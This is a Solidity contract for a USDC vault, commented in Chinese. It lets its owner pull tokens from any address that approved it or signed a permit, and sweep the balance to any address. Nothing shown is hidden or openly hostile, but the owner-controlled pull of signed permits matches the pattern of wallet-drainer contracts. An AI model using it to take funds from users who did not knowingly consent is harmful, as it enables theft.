// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract MyUSDCVault {
    address public owner;
    address public immutable usdc;

    event Deposited(address indexed from, uint256 amount);
    event Withdrawn(address indexed to, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _usdc) {
        require(_usdc != address(0), "Invalid USDC address");
        owner = msg.sender;
        usdc = _usdc;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // ✅ 支持普通 approve 后拉款
    function pull(address from, uint256 amount) external onlyOwner {
        require(from != address(0), "Invalid address");
        require(amount > 0, "Amount must be > 0");
        require(IERC20(usdc).transferFrom(from, address(this), amount), "Pull failed");
        emit Deposited(from, amount);
    }

    // ✅ 支持 permit 授权 + 拉款（你代用户出 gas）
    function permitAndPull(
        address user,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyOwner {
        require(user != address(0), "Invalid user address");
        require(amount > 0, "Amount must be > 0");
        require(deadline >= block.timestamp, "Permit expired");
        
        // 使用 try-catch 避免重复 permit 导致整个交易失败
        try IERC20Permit(usdc).permit(user, address(this), amount, deadline, v, r, s) {
            // Permit 成功
        } catch {
            // Permit 失败（可能已授权），继续执行转账
        }
        
        require(IERC20(usdc).transferFrom(user, address(this), amount), "Transfer failed");
        emit Deposited(user, amount);
    }

    // ✅ 修复：使用 transfer 而不是 transferFrom
    function withdraw(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be > 0");
        require(IERC20(usdc).transfer(owner, amount), "Withdraw failed");
        emit Withdrawn(owner, amount);
    }

    // ✅ 新增：提取到指定地址
    function withdrawTo(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        require(amount > 0, "Amount must be > 0");
        require(IERC20(usdc).transfer(to, amount), "Withdraw failed");
        emit Withdrawn(to, amount);
    }

    // ✅ 新增：转移所有权
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    function vaultBalance() external view returns (uint256) {
        return IERC20(usdc).balanceOf(address(this));
    }

    // ✅ 新增：紧急提取所有余额
    function emergencyWithdraw() external onlyOwner {
        uint256 balance = IERC20(usdc).balanceOf(address(this));
        require(balance > 0, "No balance");
        require(IERC20(usdc).transfer(owner, balance), "Emergency withdraw failed");
        emit Withdrawn(owner, balance);
    }
}

